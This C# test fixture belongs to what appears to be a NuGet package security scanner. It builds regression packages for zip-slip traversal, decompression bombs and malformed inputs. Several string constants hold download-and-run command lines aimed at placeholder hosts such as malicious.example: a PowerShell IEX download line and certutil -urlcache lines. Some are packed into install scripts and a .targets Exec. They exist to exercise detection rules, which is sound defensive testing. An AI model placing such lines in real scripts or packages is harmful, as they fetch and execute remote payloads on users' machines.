namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

using Silvergun;
using Silvergun.CodeAnalysis.IL.Tests.Fixture;

/// <summary>
/// Shared xUnit class fixture: initializes the Silvergun runtime once and stages the test
/// <c>.nupkg</c> files in a temp directory (built with pure BCL zip — see <see cref="NupkgBuilder"/>).
/// The staged packages reuse the real fixture assembly so end-to-end capability findings are known.
/// Disposal removes the temp directory.
/// </summary>
public sealed class PackageFixture : IDisposable
{
    #region Constructors
    public PackageFixture()
    {
        Runtime.Initialize("Silvergun", "TESTS");

        rootDir = Path.Combine(Path.GetTempPath(), "silvergun-pkgtests", "root-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(rootDir);

        FixtureDllPath = typeof(Shapes).Assembly.Location;
        FixtureDllName = Path.GetFileName(FixtureDllPath);
        FixtureAssemblyName = typeof(Shapes).Assembly.GetName().Name!;
        var fixtureBytes = File.ReadAllBytes(FixtureDllPath);
        ExpectedFixtureSha256 = Convert.ToHexString(SHA256.HashData(fixtureBytes)).ToLowerInvariant();

        // PkgA: rich package — lib dll, tools script, build script, fake native content dll.
        var pkgANuspec = NupkgBuilder.NuspecXml(
            PkgAId, PkgAVersion, PkgAAuthors, PkgADescription, "netstandard2.0", DependencyIds);
        PkgAPath = Path.Combine(rootDir, $"{PkgAId}.{PkgAVersion}.nupkg");
        NupkgBuilder.WriteNupkg(PkgAPath,
        [
            ($"{PkgAId}.nuspec", Encoding.UTF8.GetBytes(pkgANuspec)),
            ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
            ("tools/init.ps1", Encoding.UTF8.GetBytes("Write-Host 'installing'\n")),
            ($"build/{PkgAId}.targets", Encoding.UTF8.GetBytes("<Project></Project>\n")),
            ("content/notmanaged.dll", NupkgBuilder.NotManagedBytes),
        ]);

        // PkgB: nuspec only — no assemblies, no scripts, no dependencies.
        var pkgBNuspec = NupkgBuilder.NuspecXml(
            PkgBId, PkgBVersion, "Silvergun Tests", "Empty test package.", "netstandard2.0", []);
        PkgBPath = Path.Combine(rootDir, $"{PkgBId}.{PkgBVersion}.nupkg");
        NupkgBuilder.WriteNupkg(PkgBPath,
        [
            ($"{PkgBId}.nuspec", Encoding.UTF8.GetBytes(pkgBNuspec)),
        ]);

        // PkgC: unconventional-layout package for intake-gap coverage (ADR 0004 §3 as amended).
        //  - a root-level dll (Role=Other, no TFM) — a concealment vector that must still be inventoried/scanned;
        //  - a runtimes RID/TFM path (Role=Runtimes, TargetFramework="net6.0");
        //  - a .props build script (Role=Build).
        // Both dlls are copies of the real fixture assembly so their capability findings are known.
        var pkgCNuspec = NupkgBuilder.NuspecXml(
            PkgCId, PkgCVersion, "Silvergun Tests", "Unconventional-layout test package.", "net6.0", []);
        PkgCPath = Path.Combine(rootDir, $"{PkgCId}.{PkgCVersion}.nupkg");
        NupkgBuilder.WriteNupkg(PkgCPath,
        [
            ($"{PkgCId}.nuspec", Encoding.UTF8.GetBytes(pkgCNuspec)),
            (HiddenDllName, fixtureBytes),
            ($"runtimes/win-x64/lib/net6.0/{FixtureDllName}", fixtureBytes),
            ($"build/{PkgCId}.props", Encoding.UTF8.GetBytes("<Project></Project>\n")),
        ]);

        // PkgD: zip-slip regression package. One benign lib dll plus one malicious entry whose name escapes
        // the extraction dir via "../../". The extractor must skip the traversal entry (never writing it to
        // disk, never inventorying it) while still extracting the benign lib. The guid keeps the traversal
        // target unique so parallel/repeated runs cannot collide on the same stray file.
        ZipSlipFileName = $"silvergun-zipslip-{Guid.NewGuid():N}.dll";
        ZipSlipRelativeEntry = "../../" + ZipSlipFileName;
        var pkgDNuspec = NupkgBuilder.NuspecXml(
            PkgDId, PkgDVersion, "Silvergun Tests", "Zip-slip regression test package.", "netstandard2.0", []);
        PkgDPath = Path.Combine(rootDir, $"{PkgDId}.{PkgDVersion}.nupkg");
        NupkgBuilder.WriteNupkg(
            PkgDPath,
            [
                ($"{PkgDId}.nuspec", Encoding.UTF8.GetBytes(pkgDNuspec)),
                ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
            ],
            [
                (ZipSlipRelativeEntry, NupkgBuilder.NotManagedBytes),
            ]);

        // PkgE: backslash-separator regression package. Its single lib assembly is written with a raw entry
        // name using BACKSLASH separators — `lib\netstandard2.0\<fixture dll>` — as produced by some Windows
        // packing tools. Role/TFM derivation must split on '\' as well as '/' (Role=Lib, TFM=netstandard2.0),
        // the stored RelativePath must be canonicalized to forward slashes, and the entry must still extract
        // and scan. The dll is a copy of the SensitiveOps-bearing fixture so its findings are known.
        var pkgENuspec = NupkgBuilder.NuspecXml(
            PkgEId, PkgEVersion, "Silvergun Tests", "Backslash-separator regression test package.", "netstandard2.0", []);
        PkgEPath = Path.Combine(rootDir, $"{PkgEId}.{PkgEVersion}.nupkg");
        NupkgBuilder.WriteNupkg(
            PkgEPath,
            [
                ($"{PkgEId}.nuspec", Encoding.UTF8.GetBytes(pkgENuspec)),
            ],
            [
                ($"lib\\netstandard2.0\\{FixtureDllName}", fixtureBytes),
            ]);

        // PkgBomb: decompression-bomb regression package (ADR 0008). A single, highly compressible payload
        // entry of ~50 MB of zero bytes — it zips to a few KB, giving a compression ratio in the thousands:1,
        // far above the extractor's 200:1 cap. RecursiveExtractor's resource governor must abort extraction
        // before materializing the payload, so NuGetPackage.Open returns a failure Result (never throws / OOMs).
        // Payload bytes are all zero: tiny to allocate here, but their decompressed size is what trips the cap.
        var pkgBombNuspec = NupkgBuilder.NuspecXml(
            BombId, BombVersion, "Silvergun Tests", "Decompression-bomb regression test package.", "netstandard2.0", []);
        BombPath = Path.Combine(rootDir, $"{BombId}.{BombVersion}.nupkg");
        NupkgBuilder.WriteNupkg(BombPath,
        [
            ($"{BombId}.nuspec", Encoding.UTF8.GetBytes(pkgBombNuspec)),
            ("content/bomb.bin", new byte[50_000_000]),
        ]);

        // PkgScript: script-content-scan package (ADR 0012). Carries three scripts whose text trips the embedded
        // OSSGadget backdoor rules, plus benign identity. The .ps1 has a PowerShell IEX-download reverse-shell line
        // and a certutil LOLBAS line; the .psm1 (now inventoried per ADR 0012) has a certutil LOLBAS line; the
        // .targets (unknown language -> default LanguageInfo) has a certutil LOLBAS line. All tokens are original
        // (not copied from reference/) and benign-but-matching. The lib dll is the real fixture so the assembly
        // side of the report is unchanged in shape.
        var pkgScriptNuspec = NupkgBuilder.NuspecXml(
            PkgScriptId, PkgScriptVersion, "Silvergun Tests", "Script-content-scan test package.", "netstandard2.0", []);
        PkgScriptPath = Path.Combine(rootDir, $"{PkgScriptId}.{PkgScriptVersion}.nupkg");
        NupkgBuilder.WriteNupkg(PkgScriptPath,
        [
            ($"{PkgScriptId}.nuspec", Encoding.UTF8.GetBytes(pkgScriptNuspec)),
            ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
            ("tools/install.ps1", Encoding.UTF8.GetBytes(MaliciousPs1)),
            ("tools/module.psm1", Encoding.UTF8.GetBytes(MaliciousPsm1)),
            ($"build/{PkgScriptId}.targets", Encoding.UTF8.GetBytes(MaliciousTargets)),
        ]);

        // PkgOversize: never-throws regression for ADR 0012. Holds an oversized (>5 MiB) matching script that the
        // scanner must skip (size cap) without crashing, a malformed/binary .ps1 that must not throw when read,
        // and a small matching .ps1 whose finding must still surface — proving one bad unit never sinks the scan.
        // Pad past the 5 MiB script cap with RANDOM (incompressible) bytes so the entry does NOT trip the
        // extractor's 200:1 zip-bomb ratio cap — an all-zero/space pad would compress away and fail Open.
        var oversizeHeader = Encoding.UTF8.GetBytes(
            "Start-Process certutil -ArgumentList '-urlcache','-f','http://x.example/a.exe'\n");
        var oversizeBytes = new byte[(int)(5L * 1024 * 1024) + 4096];
        Array.Copy(oversizeHeader, oversizeBytes, oversizeHeader.Length);
        RandomNumberGenerator.Fill(oversizeBytes.AsSpan(oversizeHeader.Length));
        var pkgOversizeNuspec = NupkgBuilder.NuspecXml(
            PkgOversizeId, PkgOversizeVersion, "Silvergun Tests", "Oversized/malformed-script regression package.", "netstandard2.0", []);
        PkgOversizePath = Path.Combine(rootDir, $"{PkgOversizeId}.{PkgOversizeVersion}.nupkg");
        NupkgBuilder.WriteNupkg(PkgOversizePath,
        [
            ($"{PkgOversizeId}.nuspec", Encoding.UTF8.GetBytes(pkgOversizeNuspec)),
            ("tools/big.ps1", oversizeBytes),
            ("tools/malformed.ps1", NupkgBuilder.NotManagedBytes),
            ("tools/small.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
        ]);

        // PkgNuspecMatch: nuspec-content-scan package. Its top-level *.nuspec's <description> carries a certutil
        // LOLBAS token that trips the embedded backdoor rules — but the manifest is deliberately NOT inventoried
        // as a script (ADR 0012). Carries a benign lib (real fixture) and NO scripts, so any ScriptFinding must be
        // attributed to the nuspec (RelativePath == "<id>.nuspec"). Token is original, benign-but-matching.
        var pkgNuspecMatchNuspec = NupkgBuilder.NuspecXml(
            PkgNuspecMatchId, PkgNuspecMatchVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", []);
        PkgNuspecMatchPath = Path.Combine(rootDir, $"{PkgNuspecMatchId}.{PkgNuspecMatchVersion}.nupkg");
        NuspecMatchFileName = $"{PkgNuspecMatchId}.nuspec";
        NupkgBuilder.WriteNupkg(PkgNuspecMatchPath,
        [
            ($"{PkgNuspecMatchId}.nuspec", Encoding.UTF8.GetBytes(pkgNuspecMatchNuspec)),
            ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
        ]);

        // PkgNuspecOversize: never-throws regression for the nuspec content scan. The *.nuspec is VALID XML (so
        // Open can read identity), carries the same certutil token that WOULD match, but is padded PAST the 5 MiB
        // scanner cap with an incompressible base64 comment. base64's alphabet has no '-', so the comment never
        // forms the illegal "--" sequence; random source bytes keep it incompressible so it clears the extractor's
        // 200:1 zip-bomb ratio cap (a zero/space pad would compress away and fail Open). The scanner must SKIP the
        // oversized nuspec (size cap) without crashing, while a small matching script's finding still survives.
        var pad = Convert.ToBase64String(RandomNumberGenerator.GetBytes(6 * 1024 * 1024)); // ~8 MiB of base64 text
        var oversizeNuspecBody = NupkgBuilder.NuspecXml(
            PkgNuspecOversizeId, PkgNuspecOversizeVersion, "Silvergun Tests", NuspecMatchDescription, "netstandard2.0", []);
        var oversizeNuspec = oversizeNuspecBody.Replace("</package>", $"  <!-- {pad} -->\n</package>");
        PkgNuspecOversizePath = Path.Combine(rootDir, $"{PkgNuspecOversizeId}.{PkgNuspecOversizeVersion}.nupkg");
        NuspecOversizeFileName = $"{PkgNuspecOversizeId}.nuspec";
        NupkgBuilder.WriteNupkg(PkgNuspecOversizePath,
        [
            ($"{PkgNuspecOversizeId}.nuspec", Encoding.UTF8.GetBytes(oversizeNuspec)),
            ("tools/keep.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1)),
        ]);

        // PkgNuspecSlip: escaping-nuspec containment regression. Mirrors the PkgD zip-slip pattern, but the
        // malicious raw entry is a *.nuspec whose declared name escapes the extraction dir via "../../". The
        // package still carries a benign, valid top-level manifest ("PkgNuspecSlip.nuspec") so NuGet can read
        // identity and Open succeeds — a package whose ONLY nuspec is an escaping entry cannot be opened at all
        // (NuGet's manifest reader requires a root-level nuspec), which is why the valid manifest is retained.
        // The escaping *.nuspec carries a DISTINCT id ("PkgNuspecSlipEscaper") so that, were it ever mistakenly
        // selected, the mismatch would be unmistakable. It must never pass the IsContained/IsNuspec gate that
        // selects NuspecPath: the escaping declared name is excluded from the contained set (and, even if the
        // extractor clamps it under the root, its on-disk name still fails the contained-set membership test).
        // The guid keeps the traversal target unique so parallel/repeated runs cannot collide on a stray file.
        NuspecSlipEntryFileName = $"silvergun-nuspecslip-{Guid.NewGuid():N}.nuspec";
        NuspecSlipRelativeEntry = "../../" + NuspecSlipEntryFileName;
        NuspecSlipManifestFileName = $"{PkgNuspecSlipId}.nuspec";
        var pkgNuspecSlipManifest = NupkgBuilder.NuspecXml(
            PkgNuspecSlipId, PkgNuspecSlipVersion, "Silvergun Tests", "Escaping-nuspec containment regression test package.", "netstandard2.0", []);
        var escapingNuspec = NupkgBuilder.NuspecXml(
            "PkgNuspecSlipEscaper", PkgNuspecSlipVersion, "Silvergun Tests", "Escaping manifest that must never be selected as NuspecPath.", "netstandard2.0", []);
        PkgNuspecSlipPath = Path.Combine(rootDir, $"{PkgNuspecSlipId}.{PkgNuspecSlipVersion}.nupkg");
        NupkgBuilder.WriteNupkg(
            PkgNuspecSlipPath,
            [
                ($"{PkgNuspecSlipId}.nuspec", Encoding.UTF8.GetBytes(pkgNuspecSlipManifest)),
                ($"lib/netstandard2.0/{FixtureDllName}", fixtureBytes),
            ],
            [
                (NuspecSlipRelativeEntry, Encoding.UTF8.GetBytes(escapingNuspec)),
            ]);

        // Broken inputs: a text file renamed .nupkg, and a path that does not exist.
        FakeTextNupkgPath = Path.Combine(rootDir, "fake.nupkg");
        File.WriteAllText(FakeTextNupkgPath, "this is plain text, not a zip archive at all");
        MissingNupkgPath = Path.Combine(rootDir, $"missing-{Guid.NewGuid():N}.nupkg");
    }
    #endregion

    #region Properties
    // PkgA identity (must match the built nuspec).
    public const string PkgAId = "PkgA";
    public const string PkgAVersion = "1.2.3";
    public const string PkgAAuthors = "Silvergun Tests";
    public const string PkgADescription = "Rich test package with lib, tools, build and content payloads.";

    public const string PkgBId = "PkgB";
    public const string PkgBVersion = "2.0.0";

    public const string PkgCId = "PkgC";
    public const string PkgCVersion = "3.4.5";

    public const string PkgDId = "PkgD";
    public const string PkgDVersion = "4.5.6";

    public const string PkgEId = "PkgE";
    public const string PkgEVersion = "5.6.7";

    public const string BombId = "PkgBomb";
    public const string BombVersion = "6.7.8";

    public const string PkgScriptId = "PkgScript";
    public const string PkgScriptVersion = "7.8.9";

    public const string PkgOversizeId = "PkgOversize";
    public const string PkgOversizeVersion = "8.9.10";

    public const string PkgNuspecMatchId = "PkgNuspecMatch";
    public const string PkgNuspecMatchVersion = "9.10.11";

    public const string PkgNuspecOversizeId = "PkgNuspecOversize";
    public const string PkgNuspecOversizeVersion = "10.11.12";

    public const string PkgNuspecSlipId = "PkgNuspecSlip";
    public const string PkgNuspecSlipVersion = "11.12.13";

    /// <summary>
    /// Description embedded in the nuspec-content-scan packages: prose plus a certutil LOLBAS line that trips the
    /// embedded backdoor rules (the rule requires the token to be whitespace-delimited). Original, benign-but-matching.
    /// </summary>
    public const string NuspecMatchDescription =
        "This package scans local files during install. certutil -urlcache -f http://malicious.example/n.exe";

    /// <summary>
    /// PkgScript's install.ps1: a PowerShell IEX-download reverse-shell line plus a certutil LOLBAS line —
    /// both trip the embedded OSSGadget backdoor rules. Original content, benign but rule-matching.
    /// </summary>
    public const string MaliciousPs1 =
        "Write-Host 'starting install'\n" +
        "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/stage2.ps1')\n" +
        "Start-Process certutil -ArgumentList '-urlcache','-split','-f','http://malicious.example/payload.exe'\n";

    /// <summary>PkgScript's module.psm1: a certutil LOLBAS line (language-agnostic rule, so it matches a .psm1).</summary>
    public const string MaliciousPsm1 =
        "function Invoke-Stage {\n" +
        "    Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/mod.exe'\n" +
        "}\n";

    /// <summary>PkgScript's .targets: a certutil LOLBAS token inside an Exec, scanned via the default LanguageInfo.</summary>
    public const string MaliciousTargets =
        "<Project>\n" +
        "  <Target Name=\"Run\">\n" +
        "    <Exec Command=\" certutil -urlcache -f http://malicious.example/t.exe \" />\n" +
        "  </Target>\n" +
        "</Project>\n";

    /// <summary>PkgOversize's small.ps1: a single certutil LOLBAS line whose finding must survive alongside the skipped huge/malformed files.</summary>
    public const string SmallMatchingPs1 =
        "Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/s.exe'\n";

    /// <summary>Root-level dll in PkgC (no folder segment) — classifies as <c>Role=Other</c>.</summary>
    public const string HiddenDllName = "hidden.dll";

    /// <summary>The two declared dependencies of PkgA (id, version).</summary>
    public static readonly (string Id, string Version)[] DependencyIds =
        [("Newtonsoft.Json", "13.0.1"), ("Serilog", "3.1.1")];

    public string PkgAPath { get; }
    public string PkgBPath { get; }
    public string PkgCPath { get; }
    public string PkgDPath { get; }
    public string PkgEPath { get; }

    /// <summary>Decompression-bomb package: one ~50 MB all-zero entry that zips tiny (ratio far above the 200:1 cap).</summary>
    public string BombPath { get; }

    /// <summary>Script-content-scan package (ADR 0012): a .ps1/.psm1/.targets that trip the embedded backdoor rules.</summary>
    public string PkgScriptPath { get; }

    /// <summary>Never-throws regression package: an oversized matching script, a malformed script, and a small matching script.</summary>
    public string PkgOversizePath { get; }

    /// <summary>Nuspec-content-scan package: its top-level nuspec's description carries a certutil token; no scripts.</summary>
    public string PkgNuspecMatchPath { get; }

    /// <summary>Bare file name of PkgNuspecMatch's manifest (e.g. <c>PkgNuspecMatch.nuspec</c>) — the expected finding RelativePath.</summary>
    public string NuspecMatchFileName { get; }

    /// <summary>Never-throws regression package: an oversized (but valid) matching nuspec plus a small matching script.</summary>
    public string PkgNuspecOversizePath { get; }

    /// <summary>Bare file name of PkgNuspecOversize's manifest (e.g. <c>PkgNuspecOversize.nuspec</c>).</summary>
    public string NuspecOversizeFileName { get; }

    /// <summary>Escaping-nuspec containment package: a valid top-level manifest plus a malicious <c>../../</c> traversal <c>.nuspec</c>.</summary>
    public string PkgNuspecSlipPath { get; }

    /// <summary>Bare file name of PkgNuspecSlip's benign top-level manifest (e.g. <c>PkgNuspecSlip.nuspec</c>) — the only valid NuspecPath.</summary>
    public string NuspecSlipManifestFileName { get; }

    /// <summary>Bare file name of PkgNuspecSlip's malicious traversal manifest (e.g. <c>silvergun-nuspecslip-&lt;guid&gt;.nuspec</c>).</summary>
    public string NuspecSlipEntryFileName { get; }

    /// <summary>PkgNuspecSlip's malicious manifest name as packaged — <c>../../&lt;NuspecSlipEntryFileName&gt;</c>.</summary>
    public string NuspecSlipRelativeEntry { get; }

    public string FakeTextNupkgPath { get; }
    public string MissingNupkgPath { get; }

    /// <summary>Bare file name of PkgD's malicious traversal entry (e.g. <c>silvergun-zipslip-&lt;guid&gt;.dll</c>).</summary>
    public string ZipSlipFileName { get; }

    /// <summary>PkgD's malicious entry name as packaged — <c>../../&lt;ZipSlipFileName&gt;</c>.</summary>
    public string ZipSlipRelativeEntry { get; }

    public string FixtureDllPath { get; }
    public string FixtureDllName { get; }

    /// <summary>Simple assembly name of the fixture dll (no extension), e.g. <c>Silvergun.CodeAnalysis.IL.Tests.Fixture</c>.</summary>
    public string FixtureAssemblyName { get; }

    /// <summary>Lowercase-hex SHA-256 of the fixture dll bytes as packaged into PkgA.</summary>
    public string ExpectedFixtureSha256 { get; }
    #endregion

    #region Methods
    public void Dispose()
    {
        try
        {
            if (Directory.Exists(rootDir))
                Directory.Delete(rootDir, recursive: true);
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }

        // Belt-and-braces: if a regression ever let PkgD's traversal entry escape, it lands one level above
        // each pkg-* extraction dir — i.e. directly under the temp path. Remove any such stray so a failing
        // run cannot leave a file loose in the shared temp directory.
        try
        {
            var stray = Path.Combine(Path.GetTempPath(), ZipSlipFileName);
            if (File.Exists(stray))
                File.Delete(stray);

            // Same guard for PkgNuspecSlip's traversal manifest, which would land in the same spot on a regression.
            var nuspecStray = Path.Combine(Path.GetTempPath(), NuspecSlipEntryFileName);
            if (File.Exists(nuspecStray))
                File.Delete(nuspecStray);
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
    }
    #endregion

    #region Fields
    private readonly string rootDir;
    #endregion
}
